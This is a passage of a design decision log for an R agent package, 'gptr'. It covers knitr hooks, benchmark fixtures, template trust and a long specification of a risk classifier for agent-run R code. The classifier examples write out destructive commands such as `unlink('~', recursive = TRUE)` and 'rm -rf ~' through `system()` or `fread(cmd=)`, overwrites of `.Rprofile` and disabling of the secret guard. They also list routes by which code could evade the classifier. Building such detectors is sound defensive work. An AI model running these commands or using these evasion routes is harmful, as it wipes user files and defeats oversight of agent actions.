   sets a `knit_hooks` `after.knit` hook, which `knit()` runs from `on.exit()` (after its own
   default-hook reset) on success, error and interrupt. `doc_knitr_unhook(old, mine)` restores
   each of the three hooks only while it is still the one `doc_knitr_skip()` set (so the default
   `document` hook that `knit()` restored is kept), whatever the skip state says, so calling it
   again is harmless and hooks that code around a nested knit saved and restored are still
   removed. The signature changes from the plan's `doc_knitr_unhook(old_label, old_doc)`
   (internal, no other caller). On a knitr without `after.knit` the plan's behaviour remains.
3. **A nested knit never ends the skip of the knit that runs it.** knitr's hooks are global, so
   the `document` and `after.knit` hooks also fire at the end of every knit run while the skip is
   active: a child knit (`knit_child()` runs `knit()`; verified with knitr 1.52) and a knit or
   render run from a chunk (`knitr::knit()`, `rmarkdown::render()`). The plan's `document` hook
   therefore removed the label hook when such a knit ran between the regenerating chunk and its
   old agent chunk, and the old code ran. `doc_knitr_skip()` records how many `knitr::knit()`
   frames are on the call stack (`doc_knit_depth()`, at least 1), and both hooks end the skip only
   in a knit at that depth or shallower: the knit that set it, or one around it (they still chain
   the previous hooks). A skip set inside a child
   knit therefore ends with the child, whose document holds the old agent chunk.
   Review round 1 found that the first version (hooks inert in child mode only, `doc_knitr_unhook()`
   guarded by `knitr_hooked`) still let a nested `rmarkdown::render()` end the parent's skip, and,
   because `render()` restores the hooks it saved (gptr's), left gptr's label and `after.knit`
   hooks installed for the rest of the session.
4. Test-only: the fixture path is resolved with `normalizePath(test_path())` before
   `local_project()` changes the working directory (the coordinator's rule for P15); the plan's
   relative path made `file.copy()` fail silently and `knit()` error.
5. The code that `knit_print.gptr_session()` shows is fenced with `doc_rmd_fence()` (the agent
   chunk's rule: one backtick longer than the longest backtick run that starts a code line,
   at least three) instead of the plan's fixed three backticks, so a backtick line in the code (a
   multi-line string) no longer ends the code block early. Outputs without such lines are the
   plan's.

Also the Task 12 obligation (D-119 item 3): `doc_skip_old()` gains the plan's knitr branch,
`doc_knitr_skip(paste0("gptr-", id))` for the `knitr` driver (knitr and Quarto sites).

Seven addition tests (37 expectations): redaction (3), a failed knit (7), a child knit (6), a
skip set inside a child knit (4), a plain and a hook-restoring nested knit (14), a backtick line
in the shown code (1), and dispatch through `knitr::knit_print()` to the lazily registered methods
(2; coverage). Against the plan literal (`task16-plan-literal.R`) they fail 11 expectations
(`task16-fix1-red-plan-literal.log`; the skip-inside-a-child test passes there). Validation:
`progress/P15.md`, Task 16.

## D-131 - P15 NS-7 golden transcript: the fixture binds `analysis.R` inside its `pbmc` objects expression instead of through a separate `.doc` object, because P09's workspace block lists dot names (2026-10-05)

P15 Task 19 adds `dev/bench/tokens/fixtures/ns07-script-history.json` and its `baseline.csv` row
through P07's runner. The fixture differs from the plan's Step 1 block in one place:

1. **No `.doc` object.** The plan binds the document through a second `objects` entry,
   `".doc": "gptr::gptr_doc(file.path(getwd(), 'analysis.R'))"`, and says that "the object is
   named `.doc`, so the workspace listing ignores it". P09's workspace snapshot lists every
   binding with `ls(all.names = TRUE)` (its plan and `env_snap_rows()`; only `.Random.seed` and
   `.Last.value` are left out), so with the plan literal the first message carried
   `<workspace env="<environment>" objects="2">` with a `.doc  NULL  length 0  0 B` line
   (`gptr_doc()` returns the previous binding, `NULL`, invisibly). NS-7 is NS-1's request, whose
   workspace is `pbmc` alone (02 sections 1 and 7). The fixture now makes the same call at the
   start of the `pbmc` expression,
   `{gptr::gptr_doc(file.path(getwd(), 'analysis.R')); data.frame(...)}`, which is still the
   runner's one code hook (an `objects` expression evaluated with `baseenv()`
   as parent after the runner set the working directory and `GPTR_PROJECT_ROOT`). The workspace
   then lists `pbmc` alone; the frozen prefix is unchanged (the binding exists before
   `session_new()` either way). Measured on the working tree: `input_total` 5,918 with the plan
   literal, 5,894 with the adapted fixture; every other column is equal
   (`task19-red-plan-literal.log`, `task19-red.log`, `task19-probe-plan-literal.log`,
   `task19-probe.log`). `run.R` is unchanged.

Validation: `progress/P15.md`, Task 19.

## D-132 - P11 R classifier follows the classifier standard: level 0 only for the tables' known read-only calls (an unlisted base function is level 1), a function the code computes, passes, binds lazily or builds at run time and code gptr cannot read are level 3, literal arguments are read through do.call(), exec(), aliases and wrappers, paths through setwd(), withr, partial names, `...`, c(), file.path() and connections, moves remove and links reach their source, gptr's namespace reached by any route is control, gptr$ members and process calls take their contract levels (2026-10-05)

P11 Task 3 appends the plan's R classifier (`gptr_risk()`, `format`/`print` methods,
`risk_classify()` and the `risk.classify` service, `risk_norm()`, `risk_escape()`,
`risk_scan()`, `risk_parse()` and the walker's helpers) with the plan's interfaces, field names
and display. The plan-literal walker gave level 0 or 1 to code that calls a function it cannot
name, and the coordinator's classifier standard (D-061: (A) level 0 is an allowlist, (B) a
construct gptr does not model is at least level 3, (C) level 4 only where literal text names a
critical or control target) binds R code too. The classifier stays advisory (03 section 6.8.1).

1. **Computed calls are level 3 `dynamic`** (plan: 0 or 1). `get()`, `get0()`, `mget()`,
   `dynGet()`, `getExportedValue()`, `getFromNamespace()` of a name the code computes (plan 1;
   the table row is 3), so report 18's row `nm = 'mtcars'; get(nm)` changes from 1 to 3 (the
   only changed plan expectation); `parse(text =)`, `str2lang()`, `str2expression()` of computed
   text (plan 1); a computed function in a function slot of a higher-order function (plan 1
   except do.call/exec/invoke; `tryCatch()`/`withCallingHandlers()` handlers are slots too);
   calls of a formal argument, a loop variable or a name bound to a value the code computes
   (`f = funs[[1]]; f('x')`; plan: formals unflagged, the others 1; a name bound to a constant
   or to a known read-only call that returns data is no function, `risk_plain_value()`); a
   method of an object gptr cannot resolve (`obj$m()`, `obj[["m"]]()`, `obj@m()`,
   `baseenv()$unlink()`: plan 0), while an object in `envir` holding a user closure is read
   through its body and one holding a package function under its own name takes that row;
   closures built at run time (factory results, R6 methods, `purrr::partial()`), promises and
   active bindings (plan 1); a user function nested deeper than the plan's two levels (plan 0);
   a function whose body, formals or environment the code changes, when called (a literal
   quoted body it installs is read where it is called); `trace()` (its tracer read as code);
   `options()`, `Sys.setenv()`, `Sys.unsetenv()` with names gptr cannot read, also through a
   higher-order function or an alias (plan 2; a computed `Sys.unsetenv()` was 4 and is 3 under
   (C)); `gptr_cache()`/`gptr_scrub()` with a computed action or `dry_run` (plan 4, (C)).
2. **Level 0 is the tables' read-only rows.** A function of a base package that the tables do
   not list is level 1 `unlisted` (plan 0); syntax and control flow (`risk_r_syntax`) are
   exempt. A function R finds in one base package and the table lists under another (`plot()`
   moved from graphics to base in R 4.0) takes that row. A user function that shadows a table
   function (`summary = function(x) unlink(...)`) is read through its body (the plan used the
   row).
3. **Literal arguments are read where the call is made.** `do.call()`, `rlang::exec()` and
   `purrr::invoke()` with a literal function and argument list are read as that call
   (`do.call(Sys.setenv, list(GPTR_MODE = 'auto'))` 4); an alias is the aliased call
   (`f = unlink; f('~', recursive = TRUE)` 4); `Negate()`, `Vectorize()` and purrr's adverbs
   pass their function on; `eval()`/`evalq()` of a literal `quote()` and formal defaults are
   code; `.()` inside `bquote()` runs; a formula is no longer quoting (model functions
   evaluate its terms and purrr's `~ .x` is a function). Quoted code stays capped at 2 for
   every row, not only table rows.
4. **Paths.** Literal paths are read with Task 2's readers (globs name guarded names, a `.gptr`
   directory is control, a recursive delete above the root or home or of a top-level directory
   is 4), from the root, R's working directory and every directory a literal `setwd()`,
   `withr::with_dir()` or `local_dir()` can leave (a computed one is unknown). Path arguments are
   found by partial names, in every unnamed argument of `...` rows, inside `c()`, `file.path()`,
   `paste0()`, `path.expand()`, `normalizePath()`, `here()`, `fs::path()` and `file()`-like
   connections. `file.rename()`/`fs::file_move()` remove their source (control, critical,
   protected or a wipe 4; outside or unknown 3), links (`file.symlink()`, `file.link()`,
   `Sys.junction()`, `fs::link_create()`) reach theirs (4/3), copies read theirs (a secret file 3)
   and fs destinations are writes; `download.file()`'s destfile is a write; `untar()`/`unzip()`
   are at least 3 (4 into a control directory); `open(con, 'w')` and `fifo(..., 'w')` are 2.
5. **Processes.** `system()`, `shell()` and `pipe()` lines, `system2()` as the shell line it
   builds, `processx::run()` and `processx::process$new()` argv with `wd`, `env` and `input`
   (environment names become prefix assignments and input is piped, so Task 2's rules read
   them); `process$new()` and an indirect `get('system')` keep the table's 3; a program run after
   the code changed environment variables outside `risk_env_inert_re` is 3.
6. **gptr$ members take 04 section 9.4's levels** (the plan floored lower): `bg` 3 (plan 1),
   `script` 3 with a shell script read as one command text (heredocs, `cd`) and R or Python
   scripts read too (plan 1, line by line), `knit` engines other than the shell ones 3, MCP
   members 3 (their annotations are known only at call time; "none" is 3; plan 1), plugin
   members with their own `risk` function and unregistered members 3 (plan 2); `sh`/`bg`
   read `wd`, `env` and `input`.
7. **IC-53: gptr's namespace by any route is level 4 `control`:** `asNamespace()`,
   `getNamespace()`, `loadNamespace()`, `.getNamespace()`, `getNamespaceInfo()`,
   `rlang::ns_env()` of "gptr", `getFromNamespace(x, "gptr")`, and `environment()`,
   `rlang::fn_env()`, `rlang::get_env()` or `topenv()` of a gptr function. withr's and
   rlang's option and environment setters are read as `options()` and `Sys.setenv()`
   (`withr::local_options(gptr.secret_guard = FALSE)` 4); `op = options(digits = 3);
   options(op)` reads the recorded names (2).
8. **Robustness.** The code is read as P09's evaluator reads it (CR and CR LF line ends become LF;
   a parse that fails with `encoding = "UTF-8"` is tried as the evaluator parses); text that
   is not UTF-8 never errors or warns; a walk that cannot finish (R's expression limit: a
   6,000-term sum) or a failing secret scan is a level-3 row; `source()` of a readable file
   keeps the table's 3 as a floor (the file may change before it runs; plan max(1, content));
   `risk_norm()` reads a malformed level as 3, as P06's `call_risk()` does (plan 2). Two
   `@noRd` titles that roxygen read as links (`[leaf]`, `x[i]`) are reworded.
9. **Review round 1.** (a) A write into the environment a call returns is `object_write` 2
   also when the call has no arguments (`globalenv()$x = 1`, `parent.frame()[["x"]] = 1`; the
   plan's loop stopped before reading the head), and so is a write through a name bound to such
   a call (`e = globalenv(); e$x = 1`); `local(expr, envir)` with any environment but a
   `new.env()`, and `with()` of an environment, run code where the code names and are 3
   `dynamic`, as `evalq()` is, and their assignments are recorded (plan: `local()` was exempt
   syntax, 0). (b) A function passed to `lapply()`, `sapply()`, `vapply()`, `Map()`, `mapply()`,
   `Filter()`, `Find()`, `Position()`, `apply()`, `tapply()`, `outer()`, `sweep()`,
   `forceAndCall()`, the parallel and future applies and purrr's map, walk, map2, pmap, keep and
   detect families is read as the calls it makes: one per element of a literal vector it maps
   over (at most 32), with the arguments it passes on (`MoreArgs`, `.l`), so
   `Map(file, '~/.Rprofile', 'w')` is 4 `control` (plan 0); a function passed where gptr cannot
   match the arguments keeps its row, now without the `cat()` exemption and with connections
   read as writes of a computed path (2). A literal read of a file P03 treats as a secret is a
   3 `secret` row from the walk too (P03's text scan does not follow higher-order calls).
   (c) A namespace or environment the code computes is 3 `dynamic`: `getExportedValue()` and
   `getFromNamespace()` take their package only from a string (a variable's name was read as a
   package), the `get()` family with an `envir`, `pos` or `ns` gptr cannot name, and
   `asNamespace()`, `getNamespace()`, `loadNamespace()`, `getNamespaceInfo()` and
   `rlang::ns_env()` of a computed name. (d) A string constant assigned to a name is data: the
   plan's eager alias row (`x = 'q'` was 4 `critical`) is kept for function values only.
   (e) User S3 methods of operators and their group generics (`[.cls`, `$.cls`, `+.cls`,
   `Ops.cls`, `Math.cls`, `Summary.cls`), of replacement functions (`[<-.cls`, `names<-.cls`,
   the getters of a nested target) and user replacement functions (`tag<-`) are read through
   their bodies. (f) A user function or method first met in quoted code (capped at 2) is read
   again where the code calls it (it was read once per walk).
10. **Review round 2.** (a) A path, destination or `args` argument is the one R binds to that
   formal: the call is matched against the formals of the function a loaded namespace binds
   (`write.csv()` against `write.table()`), so `writeLines(text = 'x', '.Rprofile')`,
   `saveRDS(object = x, '.Rprofile')`, `file.copy(from = 'a', '.Rprofile')` are 4 `control` and
   `system2(command = 'rm', '-rf ~')` is 4 (plan: the unnamed argument at the formal's position,
   so a named earlier formal hid the path and `writeLines()` fell back to the console, 0). For
   a package that is not loaded every unnamed argument a named one may have moved into the
   place is read. (b) In a function or `local()` body, `<<-` is an `object_write` 2 (3 above
   `gptr.protect_size`, with its size) unless an enclosing function of the code binds the name,
   and a write into an environment (a getter's, a name bound to one, a user's environment, R6
   or data.table object that no local name shadows) is reference mutation 2 (plan: every
   assignment in a body was ignored, so `sapply(1:3, function(i) total <<- total + i)` was 0);
   top-level `<<-` reports the size too, and a `for()` variable overwrites a binding as `=` does.
   (c) `ave()`, `combn()` and `addmargins()` call the function they are given (function slots),
   and a common column name (`q`, `source`, `rm`) passed as `FUN`, `.f`, `fun`, `func`, `.fn` or
   `FUNC` of any call is read as a function unless the user's environment binds it to data.
   (d) Literal quoted code that is evaluated is code: `eval()` of `bquote()` (outside `.()`) and
   `substitute()` as of `quote()`, `eval` mapped over a literal list or `expression()`,
   `source(exprs =)`, and `options(error =, warning.expression =)` (a quoted handler or a named
   function: `options(error = q)` 4). `evalq()` is no longer read as an evaluator of its
   argument's value (`evalq(quote(q()))` returns the call; the round-1 source read it as 4).
   (e) IC-53 by any route: `environment()`, `rlang::fn_env()`, `get_env()` and `topenv()` of an
   alias, `get()` or `match.fun()` of a gptr function or of a `gptr$` member, `trace()` of a gptr
   function or `where` one is, `getAnywhere()`/`argsAnywhere()` of a name gptr's namespace binds,
   `fixInNamespace(x, 'gptr')` and the namespace getters of `c('gptr')` are 4 `control`.
   (f) Classification runs no S3 method of the user's objects (R4): member reads use
   `attr(, "names")` and `.subset2()`, and `object.size()` is cached only for atomic vectors
   without strings or attributes (a list or string vector edited in place keeps its address and
   changed its cached size); a binding gptr cannot inspect is an overwrite of unknown size, not
   absent. (g) The result of `Negate()`/`Vectorize()`/purrr's adverbs is called with the call's
   arguments, after those `purrr::partial()` binds (`Negate(file.remove)('.gptr/settings.json')`
   4), and `paste()` with a literal `sep` and `sprintf()` with only `%s` build literal paths.
11. **Review round 3.** (a) IC-53 through a function value: `:::`, the namespace getters,
   `getFromNamespace()`, `fixInNamespace()`, `environment()`, `rlang::fn_env()`, `get_env()`,
   `topenv()`, `getAnywhere()`, `argsAnywhere()` and `trace()` (`risk_reach_funs`) called as a
   value (an alias, `get()` or `match.fun()` of the name, a wrapper's result, a higher-order
   function's slot) are read as their direct call, so `get(':::')('gptr', 'the')`,
   `f = asNamespace; f('gptr')`, `lapply('gptr', asNamespace)` and
   `lapply(list(gptr_risk), environment)` are 4 `control` (were 0-1). `:::` and `::` reached so
   are no longer exempt syntax: read with arguments that are not literal (strings only when a
   higher-order function passes them: `lapply(pk, `:::`, 'the')`) they are 3 `dynamic`. Passed
   where gptr cannot see the arguments (`Reduce()`, `rapply()`, `do.call()` of a computed list),
   such a function is 3 `dynamic`, or 4 `control` when the call that passes it names gptr (the
   string or symbol, or a gptr function). A member named as a gptr function
   (`as.environment('package:gptr')$gptr_risk`) is a gptr function. (b) `print()`,
   `unclass()`, `noquote()`, `setNames()`, `as.vector()`, `I()`, `identity()`, `invisible()`,
   `structure()` and the other functions of `risk_fn_same` return the function they are given:
   `f = print(q); f()` is 4 `critical` and `f = print(gptr_config); f(mode = 'auto')` 4
   `control` (were 1). A read-only call one of whose arguments is or holds a function reference
   (a name bound to a function, a `function` literal, a call that can return any value) is no
   plain value: calling its result is 3 `dynamic`. (c) `with()`, `within()` and `transform()`
   of data that binds functions (a literal `list()`, also through `list2env()`, a name bound to
   one, or a user's list or environment in `envir`, read without forcing or dispatch) run them as
   functions the code computes, 3 `dynamic` (`with(list(f = q), f())` was 1);
   `with(df, mean(a))` stays 0. (d) A function whose body, formals or environment the code
   changes at any level of the target (`body(f)[[2]] = quote(q())`, `formals(f)$x = v`) is 3
   when the code calls it (only `body(f) =` and `formals(f) =` were seen; the change stayed
   quoted at 2). (e) `rm(list = objects())` and `rm(list = names(globalenv()))` clear the
   workspace as `rm(list = ls())` does: 4 `critical` (were 2).
12. **Review round 4.** (a) The function slots of purrr's other mappers and predicates
   (`map_df()`, `map_vec()`, the `imap_*`, `map2_*` and `pmap_*` variants, `map_if()`/`modify_if()`
   with their `.p` and `.else`, `map_at()`, `map_depth()`, `lmap()`, `every()`, `some()`,
   `none()`, ...), of dplyr's `across()`, `if_any()` and `if_all()` (a literal `list()` of
   functions in `.fns` is read function by function) and of base's `Tailcall()` are read like
   `lapply()`'s, also for a common column name: `purrr::map_df(1, q)` and
   `dplyr::filter(df, if_all(a, q))` are 4 `critical`, `across(a, gptr_config)` 4 `control`
   (were 0). `across()` stays a data-masking call for its other arguments. (b) Readers that run
   what they are given take its level, and their row applies too: `data.table::fread()`'s `cmd`,
   and an `input` without a line end that holds a space and names no file, are shell lines
   (`fread(cmd = 'rm -rf ~')` 4); an `input` or `cmd` the code computes is 3 `process`, as fread
   may run it (so `lapply(files, fread)` is 3); yaml's readers with `eval.expr` that is not a
   literal FALSE (absent: while the `yaml.eval.expr` option is TRUE, or the code sets it) are 3
   `dynamic`, and the functions of a literal `handlers` list are read as passed functions (a
   computed one is 3); DBI's `dbGetQuery()`, `dbSendQuery()`, their Arrow forms, `dbExecute()`
   and `dbSendStatement()` read a literal statement with Task 2's SQL classifier (as `gptr$sql()`
   does; `DROP TABLE` 3, `COPY ... TO '.Rprofile'` 4) and a computed one is 3 (were 0).
   (c) `tempdir()` and `tempfile()` are read where they lead (the current session's temporary
   directory; `tempfile()`'s `tmpdir`, `pattern` and `fileext`): `tempfile(tmpdir =
   '.gptr/extensions')` and `file.path(tempdir(), '.Rprofile')` are control (4),
   `file.path(tempdir())` is `tempdir()` (a recursive delete is 4), a `..` that leaves it is
   `outside`, a part the code computes is `unknown` (the plan read every path that starts with
   `tempdir()` or `tempfile()` as temp, level 1). (d) `with()` of a name the user's environment
   binds to an environment (an R6 object; a promise or an active binding may hold one; read by a
   leaf that forces nothing) runs its code there: 3 `dynamic`, a by-reference target, and its
   assignments are not workspace objects (`with(cfg, token <- 'x')` was 1); a name bound to such
   a name is one too. (e) An infix operator gptr cannot resolve is an unlisted call (1) like any
   other (plan: exempt as syntax, 0); magrittr's `%<>%` and zeallot's (and future's)
   `%<-%`/`%->%` bind their targets (`df %<>% head(2)` overwrites `df`, 2). (f) Base-package
   functions without a table row get Task 3 rows (`risk_extra_rows`; the generator and its
   checksum are unchanged): `dget()`, `methods::evalSource()` (read like `source()`),
   `utils::Sweave()` and `Exec()` 3 `dynamic` (`Exec()` evaluates its expression: `Exec(quote(q()))`
   4); `tools::Rcmd()`, `texi2dvi()`, `texi2pdf()` 3 `process`; `vi()`, `emacs()`, `pico()`,
   `xedit()`, `xemacs()`, `file.show()`, `page()` 3 `interactive`; `sys.save.image()` a write of
   its file, `Stangle()` 2; `serverSocket()`, `curlGetHeaders()`, `read.socket()`,
   `write.socket()` 2 `network`; `registerS3method()`, `.S3method()`, `importIntoEnv()` and the
   methods setters (`setMethod()`, `setGeneric()`, `setClass()`, `setRefClass()`, ...) 3
   `dynamic`, and an S3 method registered for a `gptr*` class 4 `control` (IC-53). One
   implementer row moved: `curlGetHeaders('https://example.org')` 1 to 2. (g) A literal secret
   read the walk finds sets `secret` (it held P03's findings only). (h) A string constant the
   code binds at top level (every binding of the name in the code a literal: strings, `c()`,
   `file.path()`, `paste()`, `tempfile()`) is also read where the code passes the name as a path
   or a command, in addition to the reading as a computed value, so a constant only adds levels:
   `p = '~'; unlink(p, recursive = TRUE)` and `cmd = 'rm -rf ~'; system(cmd)` are 4 (were 3).
   (i) `{`, `(`, `local()` and `evalq()` without an environment, `eval(quote(f))`, `if` and
   `switch()` (the branch a literal condition or selector takes, or the one reference every
   branch gives; a string there is data) pass on the function they return: `{q}()`,
   `local(q)()`, `switch('a', a = q)()` are 4 (were 3). `rm(list = )` of `c()` holding `ls()`,
   of a name bound to `ls()` or in a `for()` over `ls()` is 4 `critical` (was 2). (j) Commands
   built with `paste()`, `paste0()` and `sprintf()` of literal parts are read as their text
   (`system(paste('rm -rf', '~'))` 4, was 3; `system(paste('ls', '-la'))` 0, was 3);
   `curl::curl_download()`'s `destfile`, `curl_fetch_disk()`'s and `httr2::req_perform()`'s
   `path` and `httr::write_disk()` are writes of their path (`.Rprofile` 4).

Known limits (advisory classifier): a function of a package outside the tables is level 1
whatever it does (IC-54; `ps::ps_kill(ps::ps_handle())` stops R; a table row or a `risk_rule`
raises it); a computed function handed to a higher-order function outside `risk_hof_args` is
not seen; a function stored with `list(unlink)` and called through an unknown higher-order
function is not seen; S4 methods and package load hooks are not read; an anonymous function's
formals are not bound to the arguments of its immediate call (`(\(f) f('~'))(unlink)` is 3,
not 4); a write to a path the code computes keeps the plan's level 2 and a delete of one is 3
(D-061 rates a shell write to a word it cannot name 3; in R such a target is mostly a
connection, whose path is read where it is opened, or a path variable, and the plan's case
`con = file('out.txt', 'w'); writeLines('hi', con)` is 2), while a string constant the code
binds is read where it is used (12 (h)); the data of `with()` that the code computes
(`with(make_list(), f())`) binds names gptr cannot see, so a name called there that nothing else
binds stays an unlisted call (1); string constants bound inside function bodies are not
followed.

Validation: `progress/P11.md`, Task 3.

## D-133 - P17 template commands: commands registered or removed after a sync are seen at the next sync and at dispatch, a template command runs only while its group is what a sync would register now, a plugin's code commands win over templates, template names and the /<plugin> dispatcher use ASCII whitespace in every locale, and directories are not template files (2026-10-05)

P17 Task 6 (`R/skill-templates.R`). The plan's 7 tests, the shipped `/review` and `/explain` and
the produced names are unchanged; `template_handler()`, `template_command()` and
`template_specs()` gain optional trailing arguments (`name`, `group`), and the plan's
`template_owned_commands()` is replaced by `template_foreign_commands()`.

1. **Commands win over templates after the sync too** (the task's prose; Pi's dispatch order,
   report 05 section 4.8). The plan found "a command registered by something else" by name,
   `setdiff(registry_names("command"), template_owned_commands())`, and `template_sync()` skipped
   a group while its files and the registry generation were unchanged. A command registered
   after the sync (`gptr_register()`, or a plugin enabled at a later session start) under the
   name of a template command was never seen, because its name counted as P17's own: the project
   template (rank 1) kept shadowing it, and a user template (rank 3) won the tie with
   `gptr_register()` (rank 3) as the first registered. A command removed after the sync left the
   template without its command until a file changed. `template_foreign_commands()` now decides
   by record id: the names of the process-level `command` records that no filter disables
   (`registry_rec_filtered()`) and whose id is not one of P17's own (the `ids` of every resource
   group and of every plugin entry, Task 10's declarative records). A disabled record of P17
   (for example built-in `/review` under `-builtin:prompts`) or one removed elsewhere (a package
   unload) therefore hides no other command; the round-1 review found that a first version,
   which counted names against the groups' keys, let such a record hide one. And
   `template_group_sig()` adds the group's template names that such commands hold to the
   group's signature, so a later registration, removal or filter change re-syncs the group.
2. **A template command runs only while its group is current** (contract reading 6: untrusted
   project templates are not registered; IC-52; 04 section 10.1). Each command that
   `template_sync()` registers knows its group, and its handler first checks
   `template_group_current()` (the signature and generation a sync would give now). Otherwise it
   syncs and hands the call to the command that now has the name, or returns a message naming
   `/<name>`. Between session starts this keeps a project template from running after
   `gptr_trust(p, FALSE)`, after a move to another project (nested ones included, as in D-129)
   or after its file changed, and applies item 1 at the first call. Plugin template commands
   (Task 10's resource handlers) have no group and are unchanged.
3. **A plugin's code commands win over templates.** The plan counted every name in a plugin
   entry's `provides` as P17's own, but Task 10 adds the manifest's `extension.provides` (records
   the plugin's factory registers) to `provides` and keeps the declarative records P17 itself
   registered in `ids` (their `kind:name` in `decl`). Only those `ids` count as P17's own.
4. **The `/<plugin>` dispatcher splits on ASCII whitespace** (the set of the command pattern and
   of `template_args_parse()`, D-084) instead of TRE `[[:space:]]` after `trimws()`: U+2003 and
   U+3000 ended the command name in UTF-8 locales but not under `LC_ALL=C`, and a leading
   vertical tab or form feed gave an empty command name.
5. **Directories are not template files.** `template_files()` drops directories named `*.md`
   (Pi reads files only); the plan parsed them and logged "cannot read the file".
6. `template_sync()` prunes the groups that are no longer discovered before it syncs the others
   (the plan pruned after), so the records of a group that is gone (an untrusted or left
   project) are removed before the remaining groups are rewritten.
7. **A template name may not hold ASCII whitespace, in every locale.** `template_parse()`
   checked the name with TRE `[[:space:]]`, which matches U+2003 and U+3000 in a UTF-8 locale
   but not under `LC_ALL=C`; it now uses the set of item 4 (byte-wise), the set that P02's
   `command` name check and the command pattern use, so the same file gives the same command
   in every locale.

Tests: seven regression tests (24 expectations) under `# Task 6 adaptations (D-133)`, and five
more (22 expectations) under `# Task 6 review round 1 (D-133)`. Against the plan-literal source
`^skill-templates$` gave `[ FAIL 14 | WARN 0 | SKIP 0 | PASS 128 ]`; mutants: without the
dispatch check 6 failures, without the names in the signature 4, `provides` instead of `decl` 1.
The round-1 tests against the first version gave 8 failures; mutants of the id rule: without
the filter check 2 failures, without the process-level check 2, without the plugin entries'
`ids` 1, the TRE name check 4.

Validation: `progress/P17.md`, Task 6.

## D-134 - P17 agent lookups sync and fail closed; untrusted project agents never shadow (2026-10-05)
- Rule: `agent_def.get` syncs before every name lookup (no stale trust, project or file; as D-129),
  as `auto`: a lookup cannot know its session's mode, so it fails closed (IC-52, conventions 11).
- Rule: an untrusted project's agents rank 7 (`res_roots()`) and are not registered when their
  `res_norm()` name equals a trusted or `res_foreign_names("agent")` agent's (04 6.2, IC-42).
- Rule: only the project's `.pi/agents` and the user's `.pi/agent/agents` are flat; `agent_files()`
  skips directories named `*.md`.
- Contract-visible: rank 7 in `gptr_registry()` (04 section 10.1 lists 0/1/3/5/6); `agent_def.get`
  signals `gptr_error_untrusted` (`what = "agent"`, `path`, `origin`) whenever nobody can answer,
  in every mode (04 section 7.0, IC-52). Neither section is amended yet (open).
- Tests: test-subagent-defs.R `# Task 8 adaptations (D-134)` (8 tests). Evidence: progress/P17.md
  Task 8.

## D-135 - Maintainer decisions: the entry point is `peter()`; simplicity first (2026-10-05)

1. **Naming.** The maintainer renamed the main entry point. The package stays `gptr`; users call
   `peter(...)` in scripts and at the console (formerly `gptr()`), and its member namespace is
   `peter$...` (formerly `gptr$...`; the namespace is the same gateway object, so it follows the
   function). Other exports keep the `gptr_` prefix (`gptr_last()`, `gptr_usage()`, ...). The specs,
   plans, prompts, model-facing texts, token baselines, examples, README and code are updated in one
   coordinated change; until then older text saying `gptr()`/`gptr$` means `peter()`/`peter$`.
2. **Simplicity.** Occam's razor is a primary design and review criterion (CLAUDE.md, conventions
   section 11): smallest design that meets the contract, one conservative rule over many special
   cases, no duplicated logic or redundant text. A retrospective simplicity review of the existing
   code follows; it changes no contract behaviour and keeps every acceptance test.
3. **Why `peter`.** The name honours Peter Cathcart Wason (1924-2003), whose work on human
   reasoning with Jonathan Evans framed the dual-process ("System 1" / "System 2") view that gptr
   unifies (typed System 1 decisions inside R control flow, System 2 reasoning models in the agent
   loop), and Peter Naur (1928-2016) of the Backus-Naur form, a notation for the syntax of
   programming languages, in the spirit of recording agent sessions as readable, replayable
   documents (R scripts, R Markdown/Quarto, Jupyter notebooks). The README and `?peter` say so.
   The maintainer confirmed both naming calls (namespace `peter$`, other exports keep `gptr_`).
4. **Rename details (coordinator, 2026-10-05).** Extension factories keep their API object
   `function(gptr)` (the package's extension API, not the agent). Labels naming the gateway object
   say `peter`. The agent persona in the system prompt and the console prompt (P14) say Peter /
   `peter> `, since the maintainer named the agent Peter. Contract-visible simplifications DEC-1..4
   of `progress/simplicity-plan.md` are not taken; the contract stays. The P11 classifier redesign
   (P11-B, allowlist level 0, unmodelled constructs level 3) is accepted under D-061 and
   architecture 6.8.1; its level changes are listed in the plan and reported to the maintainer.

## D-136 - P10 builtin:r: images that gptr$plot() and gptr$read() attach count against the `r` output budget, three P06 tests also drop builtin:r, and the `r` tool has no risk function of its own (2026-10-05)

P10 Task 11 adds `R/tool-r.R` (the `r` tool, `builtin:r`) as the plan gives it, with three changes:

1. **Image tokens (IC-67: "Image tokens count against `gptr.r_output_tokens`").** The plan's
   `r_tool_result()` added the marker's images (from `gptr$plot()` and `gptr$read()`) after
   `format_eval_result()` had sized the text, so only the evaluator's own plots reduced the text
   budget. `r_tool_execute()` now adds the marker's images to the evaluation result before
   formatting; P09's formatter subtracts every attached image's tokens. The result's images and
   `details$plots` are unchanged.
2. **P06 tests (outside P10's files; D-121 precedent, expectations unchanged).** Registering the
   real `r` tool added `r` to the tool names of the two fallback-freeze tests and of "the fallback
   freeze evaluates function parameters and available()" (`test-agent-run.R`), and its schema
   pushed the first request of "a token budget stops the run ..." (`test-session-budget.R`) over
   its 1,000-token budget. They now disable `builtin:r` too (`local_without_builtin(c("tools",
   "r"))`, or `"r"`); the harness helper's comment names it.
3. **No `r_tool_risk()` (conventions 11, no duplicated logic).** P06's `call_risk()` already
   rates a call named `r` through the `risk.classify` service in `run_eval_env(run)` (what
   `ctx$envir` resolves to in a run), and level 2 without it, so the plan's function only
   shadowed that branch. `builtin:r` registers no `risk`; the risk test calls `call_risk()`.

Validation: `progress/P10.md`, Task 11.

## D-137 - CI-6 hosted portability: ctx's active members are read by calling their functions (R >= 4.6), and a dangling Codex control link is marked unreadable on Windows (2026-10-05)

1. **ctx's active members (P02 `R/ext-api.R`, contract 10.6).** R 4.6.0 marks a value read
   through an active binding as not mutable (NEWS 4.6.0; `getActiveValue()` in
   `src/main/envir.c`, svn r89121). For an environment that sets its reference count to the
   maximum for good, so a function-frame home read as `ctx$envir` is never cleaned up when its
   function returns: a forced argument keeps the user's object shared and the next in-place edit
   copies it (rule R2, IC-41). `$.gptr_ctx` and `[[.gptr_ctx` now call an active member's
   function (`activeBindingFunction()`, base R >= 4.0.0). The members stay active bindings with
   the same values. Read ctx members with `$` or `[[`: `get()`, `get0()`, `mget()` or
   `as.list()` on a ctx go through the binding and pin the frame on R >= 4.6.
2. **Dangling control links on Windows (P20 `R/cli-codex.R`, D-106).** R reads no symbolic link
   target on Windows (`Sys.readlink()` gives ""), so a control file that is a dangling link gets
   the `unreadable:<size> <time>` marker there, not `link:<target>`, and a dangling link pointed
